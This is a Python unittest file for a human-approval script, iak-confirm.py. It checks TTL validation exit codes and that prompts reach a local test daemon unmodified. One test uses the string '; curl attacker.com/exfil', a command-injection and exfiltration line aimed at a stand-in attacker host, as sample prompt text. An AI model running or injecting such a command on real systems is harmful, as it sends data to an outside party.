#!/usr/bin/env python3

# SPDX-License-Identifier: AGPL-3.0-only

"""Tests for scripts/iak-confirm.py.

Runs against a real throwaway HTTP server playing the IAK daemon, so the
transport is exercised rather than mocked away. The rule this exists to
protect: the script's own docstring reserves exit code 1 for an explicit
Deny tap. An invalid --ttl used to raise an uncaught ValueError and fall
through to that same exit code, making a typo in the TTL indistinguishable
from a human declining. It must return a distinct code (2) instead.

Run: python3 -m unittest test/iak_confirm_test.py
"""

import importlib.util
import json
import os
import threading
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from unittest import mock

_HERE = os.path.dirname(os.path.abspath(__file__))
_SCRIPT = os.path.join(_HERE, "..", "scripts", "iak-confirm.py")
_spec = importlib.util.spec_from_file_location("iak_confirm", _SCRIPT)
ic = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(ic)


def make_daemon():
    """A throwaway daemon that accepts one /intent and immediately approves
    it, so the poll loop in main() exits on its first pass."""
    received = {}

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            received["body"] = json.loads(self.rfile.read(length))
            payload = json.dumps({"ok": True, "id": "i1"}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def do_GET(self):
            payload = json.dumps([{"id": "i1", "decision": "approve"}]).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, *a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True).start()
    return srv, "http://127.0.0.1:%d" % srv.server_address[1], received


class IakConfirmCase(unittest.TestCase):
    """Base that points the script at a throwaway approving daemon and
    strips out the real 3s poll cadence, which is daemon-polling courtesy,
    not something a test needs to wait out."""

    def setUp(self):
        srv, base, self.received = make_daemon()
        self.addCleanup(srv.shutdown)
        self.addCleanup(setattr, ic, "BASE", ic.BASE)
        ic.BASE = base
        sleep_patch = mock.patch.object(ic.time, "sleep", lambda s: None)
        sleep_patch.start()
        self.addCleanup(sleep_patch.stop)

    def run_main(self, prompt, ttl=None):
        argv = ["iak-confirm.py", prompt] + ([str(ttl)] if ttl is not None else [])
        with mock.patch.object(ic.sys, "argv", argv):
            return ic.main()


class TestTtlValidation(IakConfirmCase):
    def test_invalid_ttl_is_not_treated_as_denial(self):
        # Each of these used to raise ValueError (or fail the range check)
        # and the old code let that propagate into exit 1 -- the same code
        # as an explicit Deny tap.
        for ttl in ("abc", "-1", "0", "86401"):
            with self.subTest(ttl=ttl):
                self.assertEqual(self.run_main("test prompt", ttl), 2)

    def test_valid_ttl_is_accepted(self):
        for ttl in ("1", "240", "86400"):
            with self.subTest(ttl=ttl):
                self.assertEqual(self.run_main("test prompt", ttl), 0)


class TestPromptHandling(IakConfirmCase):
    def test_prompt_is_sent_unmodified(self):
        # A prompt containing shell metacharacters is just text a human reads
        # on a phone screen -- this script never execs anything, so it must
        # reach the daemon exactly as given rather than being rejected.
        prompt = "; curl attacker.com/exfil"
        self.assertEqual(self.run_main(prompt), 0)
        self.assertEqual(self.received["body"]["prompt"], prompt)

    def test_long_prompt_is_not_truncated(self):
        # Silently shortening the question would mean the human approves
        # something other than what was actually asked.
        prompt = "x" * 5000
        self.assertEqual(self.run_main(prompt), 0)
        self.assertEqual(self.received["body"]["prompt"], prompt)


if __name__ == "__main__":
    unittest.main()
